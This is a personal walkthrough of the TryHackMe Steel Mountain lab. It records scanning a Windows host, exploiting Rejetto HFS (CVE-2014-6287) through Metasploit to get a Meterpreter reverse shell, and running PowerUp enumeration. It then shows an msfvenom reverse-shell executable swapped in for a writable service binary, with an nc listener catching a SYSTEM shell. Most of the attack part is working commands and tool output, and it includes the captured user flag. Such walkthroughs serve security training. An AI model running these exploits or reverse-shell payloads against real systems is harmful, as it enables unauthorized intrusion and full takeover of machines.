---
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access. 
---

![|101](https://i.imgur.com/HVTz2Ca.png)

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

``` download img from page -ip(Employee of the month)
┌──(kali㉿kali)-[~/Downloads/steel_mountain]
└─$ ls  
BillHarper.png  HVTz2Ca.png
                                        
```
Who is the employee of the month? (Reverse image search)
*Bill Harper*  

###  Initial Access 

Now you have deployed the machine, lets get an initial shell!

```
┌──(kali㉿kali)-[~/Downloads/steel_mountain]
└─$ rustscan -a 10.10.24.125 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.24.125:80
Open 10.10.24.125:135
Open 10.10.24.125:139
Open 10.10.24.125:445
Open 10.10.24.125:5985
Open 10.10.24.125:8080
Open 10.10.24.125:3389
Open 10.10.24.125:47001
Open 10.10.24.125:49152
Open 10.10.24.125:49153
Open 10.10.24.125:49154
Open 10.10.24.125:49155
Open 10.10.24.125:49156
Open 10.10.24.125:49163
Open 10.10.24.125:49164
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-25 13:34 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Initiating Ping Scan at 13:34
Scanning 10.10.24.125 [2 ports]
Completed Ping Scan at 13:34, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:34
Completed Parallel DNS resolution of 1 host. at 13:34, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:34
Scanning 10.10.24.125 [15 ports]
Discovered open port 3389/tcp on 10.10.24.125
Discovered open port 445/tcp on 10.10.24.125
Discovered open port 80/tcp on 10.10.24.125
Discovered open port 8080/tcp on 10.10.24.125
Discovered open port 139/tcp on 10.10.24.125
Discovered open port 135/tcp on 10.10.24.125
Discovered open port 5985/tcp on 10.10.24.125
Discovered open port 49164/tcp on 10.10.24.125
Discovered open port 49152/tcp on 10.10.24.125
Discovered open port 49155/tcp on 10.10.24.125
Discovered open port 49163/tcp on 10.10.24.125
Discovered open port 49154/tcp on 10.10.24.125
Discovered open port 47001/tcp on 10.10.24.125
Discovered open port 49156/tcp on 10.10.24.125
Discovered open port 49153/tcp on 10.10.24.125
Completed Connect Scan at 13:34, 0.41s elapsed (15 total ports)
Initiating Service scan at 13:34
Scanning 15 services on 10.10.24.125
Service scan Timing: About 53.33% done; ETC: 13:35 (0:00:50 remaining)
Completed Service scan at 13:35, 85.61s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.24.125.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 6.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.97s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Nmap scan report for 10.10.24.125
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-08-25 13:34:02 EDT for 94s

PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-date: 2022-08-25T17:35:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-08-24T17:33:00
| Not valid after:  2023-02-23T17:33:00
| MD5:   d89b d363 0de9 d44b ca1f cb0a 2a67 4b47
| SHA-1: a83b 8c38 fae1 1fb2 2c4f 9bd2 d381 33f5 4b57 50ed
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQFp4FrOiTPZ1DC63dT+/SaTANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIyMDgyNDE3MzMwMFoXDTIzMDIy
| MzE3MzMwMFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAL/GdNNapZT/vMkzkd0aJM4wjj0dtFzPXQg+NEY+
| lr8/pnMcDN+L04okwmIqVKT/AJewpcQQ3D9u5YzjqdV6SuQsZJtchMbJzRXYL8vj
| Ty/JN6G0h6YI5xpIVMRikWKMOBRhJ0+fbM+ndFr50mX7zvUDeG6s/mSNvqi9Y8Hs
| 3bkiK1n5l3+wWjzPZY9DUAFQBjlJM9RZzyTYrgYPpt+HIu2dTLOFnXOQrH+c9LgX
| CXxhvtuaNHYmfS7C619J/dgYdbRciqMYrgx3b999v9loIZoFqpQvUzdCd2BRSqoB
| d709IM0J8PoPghGBRUItM5hk/7ha/agLJrOo+Yh0Gpb1jlsCAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQBW51qct2fkayZfYH9/CWuYavxkXycKOLMPc7j/PsS5IN05MCDAyB4hS//dRiEW
| ZUL8n5uVX9V+0pu/2oo+CNLWKzX8HSLvNXJGHnkdAYPyW7dhTnkio5zEpSqG34gS
| O85xBihEswXPLfIoIX8RCaFiiz1SK+MMfBKEKeLXiQ0aFJd4zx3TEUI99SQ1doAI
| QmQ/zM9LXF+vH7dmlgLaEjD4WRsgSVYZoEpGM6bsM5aLmjsbrvdZOtJk+mpupxqE
| 2Cq2+KsVONRBqrj9vh2wcI9hUJON/vXhq925+oOON9oYQKnm4ImFyjSCMvULgtda
| 2FAxBZCfkskyQnfmfY9JXPhG
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-08-25T17:35:30+00:00
5985/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: HFS /
47001/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack Microsoft Windows RPC
49164/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52542/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 47000/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62926/udp): CLEAN (Timeout)
|   Check 4 (port 32919/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:65:24:52:af:01 (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02 65 24 52 af 01 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
|   date: 2022-08-25T17:35:30
|_  start_date: 2022-08-25T17:32:53
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:35
Completed NSE at 13:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.64 seconds

```
Scan the machine with nmap. What is the other port running a web server on? *8080*

Take a look at the other web server. What file server is running? *Rejetto Http File Server* (after pressing Server information
HttpFileServer 2.3
Server time: 8/25/2022 10:45:07 AM
Server uptime: 00:11:39  so the url is http://www.rejetto.com/hfs/ and hfs means Http File Server)



What is the CVE number to exploit this file server? *2014-6287 * (explot-db  -> https://www.exploit-db.com/exploits/39161)

```use kali tryhackme because doesn't work with my vpn
root@kali:~# msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution                                   


msf5 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.100.38     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

*lhost here is default*
msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.24.125
rhosts => 10.10.24.125
msf5 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.100.38:4444 
[*] Using URL: http://0.0.0.0:8080/2DxfeX
[*] Local IP: http://10.10.100.38:8080/2DxfeX
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /2DxfeX
[*] Sending stage (176195 bytes) to 10.10.24.125
[*] Meterpreter session 1 opened (10.10.100.38:4444 -> 10.10.24.125:49275) at 2022-08-25 18:12:40 +0000
[!] Tried to delete %TEMP%\lrVQSgCCUL.vbs, unknown result
[*] Sending stage (176195 bytes) to 167.94.145.57
[*] Server stopped.


meterpreter > search -f user.txt
Found 1 result...
    c:\Users\bill\Desktop\user.txt (70 bytes)
meterpreter > cat c:\Users\bill\Desktop\user.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat "c:\Users\bill\Desktop\user.txt"
��b04763b6fcf51fcd7c13abc7db4fd365

```

Use Metasploit to get an initial shell. What is the user flag? *b04763b6fcf51fcd7c13abc7db4fd365*

###  Privilege Escalation 



Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!
Answer the questions below

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Now you can use the upload command in Metasploit to upload the script

![](https://i.imgur.com/Zqipdba.png)

```
─(kali㉿kali)-[~/Downloads/steel_mountain]
└─$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2022-08-25 15:01:58--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: ‘PowerUp.ps1’

PowerUp.ps1        100%[==============>] 586.50K  --.-KB/s    in 0.06s   

2022-08-25 15:01:59 (10.0 MB/s) - ‘PowerUp.ps1’ saved [600580/600580]



```

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

![|444](https://i.imgur.com/1IEi13Y.png)

```
meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
meterpreter > cd "C:\Users\bill\Desktop"
meterpreter > dir
Listing: C:\Users\bill\Desktop
==============================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  2238690  fil   2022-08-25 14:57:09 -0400  PowerUp.ps1
100666/rw-rw-rw-  282      fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70       fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter > upload PowerUp.ps1
[*] uploading  : /home/kali/Downloads/steel_mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/Downloads/steel_mountain/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/kali/Downloads/steel_mountain/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > ..\PowerUp.ps1
ERROR: ..\PowerUp.ps1 : The term '..\PowerUp.ps1' is not recognized as the name of a cmdlet, function, script file, or
ERROR: operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
ERROR: again.
ERROR: At line:1 char:1
ERROR: + ..\PowerUp.ps1
ERROR: + ~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (..\PowerUp.ps1:String) [], CommandNotFoundException
ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
ERROR: 
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files

```

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability? *AdvancedSystemCareService9*

```
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```
The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
Use msfvenom to generate a reverse shell as an Windows executable.
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead. *No answer needed*

```
PS > ^C
Terminate channel 3? [y/N]  n

PS > ^Z
Background channel 3? [y/N]  y
meterpreter > cd "C:\Program Files (x86)\IObit\"
[-] Parse error: Unmatched quote: "cd \"C:\\Program Files (x86)\\IObit\\\""
meterpreter > cd 'C:\Program Files (x86)\IObit\'
meterpreter > dir
Listing: C:\Program Files (x86)\IObit
=====================================

Mode           Size   Type  Last modified            Name
----           ----   ----  -------------            ----
040777/rwxrwx  32768  dir   2022-08-25 13:33:46 -04  Advanced SystemCare
rwx                         00
040777/rwxrwx  16384  dir   2019-09-27 01:35:24 -04  IObit Uninstaller
rwx                         00
040777/rwxrwx  4096   dir   2019-09-26 11:18:50 -04  LiveUpdate
rwx                         00

meterpreter > upload Advanced.exe
[*] uploading  : /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
[*] uploaded   : /home/kali/Downloads/steel_mountain/Advanced.exe -> Advanced.exe
meterpreter > shell
Process 4944 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5036
        FLAGS              : 

C:\Program Files (x86)\IObit>


┌──(kali㉿kali)-[~/Downloads/steel_mountain]
└─$ nc -nlvp 4443        
listening on [any] 4443 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.24.125] 49352
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cat 'c:\users\administrator\desktop\root.txt'
cat 'c:\users\administrator\desktop\root.txt'
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>more 'c:\users\administrator\desktop\root.txt'
more 'c:\users\administrator\desktop\root.txt'
Cannot access file C:\Windows\system32\'c:\users\administrator\desktop\root.txt'

C:\Windows\system32>cd 'c:\users\administrator\desktop\'
cd 'c:\users\administrator\desktop\'
The filename, directory name, or volume label syntax is incorrect.

C:\Windows\system32>cd ..\..    
cd ..\..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\

10/12/2020  12:06 PM         3,162,859 EC2-Windows-Launch.zip
09/26/2019  07:17 AM    <DIR>          inetpub
10/12/2020  12:06 PM            13,182 install.ps1
08/22/2013  08:52 AM    <DIR>          PerfLogs
09/29/2019  05:42 PM    <DIR>          Program Files
09/29/2019  05:46 PM    <DIR>          Program Files (x86)
09/26/2019  11:29 PM    <DIR>          Users
10/12/2020  12:09 PM    <DIR>          Windows
               2 File(s)      3,176,041 bytes
               6 Dir(s)  44,151,877,632 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users

09/26/2019  11:29 PM    <DIR>          .
09/26/2019  11:29 PM    <DIR>          ..
09/26/2019  07:11 AM    <DIR>          Administrator
09/27/2019  09:09 AM    <DIR>          bill
08/22/2013  08:39 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  44,151,877,632 bytes free

C:\Users>cd Administrator
